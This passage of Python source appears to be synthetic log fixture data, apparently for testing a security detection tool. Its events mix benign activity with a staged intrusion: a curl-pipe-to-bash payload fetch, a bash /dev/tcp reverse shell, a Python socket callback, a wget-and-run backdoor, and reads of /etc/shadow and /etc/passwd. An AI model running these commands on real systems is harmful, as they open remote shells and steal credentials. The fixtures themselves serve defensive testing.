...
EMBEDDED_EVENTS = [
    {"ts": "2026-09-04T14:00:00Z", "host": "web-srv-01", "src": "192.168.1.10", "type": "process_start", "user": "www-data", "cmd": "/usr/sbin/nginx"},
    {"ts": "2026-09-04T14:00:01Z", "host": "web-srv-01", "src": "192.168.1.10", "type": "connection", "dst": "10.0.0.5:3306", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:02Z", "host": "web-srv-01", "src": "192.168.1.10", "type": "file_access", "path": "/var/www/html/index.php", "perm": "read"},
    {"ts": "2026-09-04T14:00:03Z", "host": "web-srv-01", "src": "192.168.1.10", "type": "auth", "user": "www-data", "result": "success"},
    {"ts": "2026-09-04T14:00:05Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "process_start", "user": "root", "cmd": "/bin/bash -c curl http://10.0.0.99/payload.sh | bash"},
    {"ts": "2026-09-04T14:00:06Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "connection", "dst": "10.0.0.99:80", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:07Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "process_start", "user": "root", "cmd": "/usr/bin/python3 -c 'import socket; s=socket.socket(); s.connect((\"10.0.0.99\",4444))'"},
    {"ts": "2026-09-04T14:00:08Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "file_access", "path": "/etc/shadow", "perm": "read"},
    {"ts": "2026-09-04T14:00:09Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "connection", "dst": "10.0.0.99:4444", "proto": "tcp"},
    {"ts": "2026-09-04T14:00:10Z", "host": "web-srv-01", "src": "10.0.0.50", "type": "process_start", "user": "root", "cmd": "/bin/bash -c crontab -e"},
    {"ts": "2026-09-04T14:01:00Z", "host": "db-primary", "src": "192.168.1.20", "type": "process_start", "user": "mysql", "cmd": "/usr/sbin/mysqld"},
    {"ts": "2026-09-04T14:01:01Z", "host": "db-primary", "src": "192.168.1.20", "type": "connection", "dst": "0.0.0.0:3306", "proto": "tcp"},
    {"ts": "2026-09-04T14:01:02Z", "host": "db-primary", "src": "192.168.1.20", "type": "query", "user": "app_user", "sql": "SELECT * FROM users"},
    {"ts": "2026-09-04T14:01:03Z", "host": "db-primary", "src": "192.168.1.20", "type": "query", "user": "app_user", "sql": "SELECT * FROM users WHERE id=1"},
    {"ts": "2026-09-04T14:05:00Z", "host": "db-primary", "src": "10.0.0.77", "type": "auth", "user": "root", "result": "success"},
    {"ts": "2026-09-04T14:05:01Z", "host": "db-primary", "src": "10.0.0.77", "type": "query", "user": "root", "sql": "LOAD_FILE('/etc/passwd')"},
    {"ts": "2026-09-04T14:05:02Z", "host": "db-primary", "src": "10.0.0.77", "type": "query", "user": "root", "sql": "SELECT * FROM mysql.user"},
    {"ts": "2026-09-04T14:05:03Z", "host": "db-primary", "src": "10.0.0.77", "type": "process_start", "user": "root", "cmd": "/bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"},
    {"ts": "2026-09-04T14:05:04Z", "host": "db-primary", "src": "10.0.0.77", "type": "file_access", "path": "/var/log/auth.log", "perm": "read"},
    {"ts": "2026-09-04T14:05:05Z", "host": "db-primary", "src": "10.0.0.77", "type": "connection", "dst": "10.0.0.99:4444", "proto": "tcp"},
    {"ts": "2026-09-04T14:08:00Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "example.com", "client": "192.168.1.50"},
    {"ts": "2026-09-04T14:08:01Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "google.com", "client": "192.168.1.51"},
    {"ts": "2026-09-04T14:08:02Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "github.com", "client": "192.168.1.52"},
    {"ts": "2026-09-04T14:08:03Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.168.1.53"},
    {"ts": "2026-09-04T14:08:04Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.168.1.54"},
    {"ts": "2026-09-04T14:08:05Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.168.1.55"},
    {"ts": "2026-09-04T14:08:06Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "evil.example.com", "client": "192.168.1.56"},
    {"ts": "2026-09-04T14:08:07Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "c2.malware.net", "client": "192.168.1.53"},
    {"ts": "2026-09-04T14:08:08Z", "host": "dns-resolver", "src": "192.168.1.2", "type": "dns_query", "domain": "c2.malware.net", "client": "192.168.1.54"},
    {"ts": "2026-09-04T14:11:00Z", "host": "workstation-3", "src": "192.168.1.50", "type": "process_start", "user": "jdoe", "cmd": "/usr/bin/python3 -c 'import os; os.system(\"wget http://10.0.0.99/backdoor\")'"},
    {"ts": "2026-09-04T14:11:01Z", "host": "workstation-3", "src": "192.168.1.50", "type": "connection", "dst": "10.0.0.99:80", "proto": "tcp"},
    {"ts": "2026-09-04T14:11:02Z", "host": "workstation-3", "src": "192.168.1.50", "type": "file_access", "path": "/tmp/backdoor", "perm": "write"},
    {"ts": "2026-09-04T14:11:03Z", "host": "workstation-3", "src": "192.168.1.50", "type": "file_access", "path": "/tmp/backdoor", "perm": "execute"},
    {"ts": "2026-09-04T14:11:04Z", "host": "workstation-3", "src": "192.168.1.50", "type": "process_start", "user": "jdoe", "cmd": "/tmp/backdoor"},
    {"ts": "2026-09-04T14:11:05Z", "host": "workstation-3", "src": "192.168.1.50", "type": "connection", "dst": "10.0.0.99:8080", "proto": "tcp"},
]
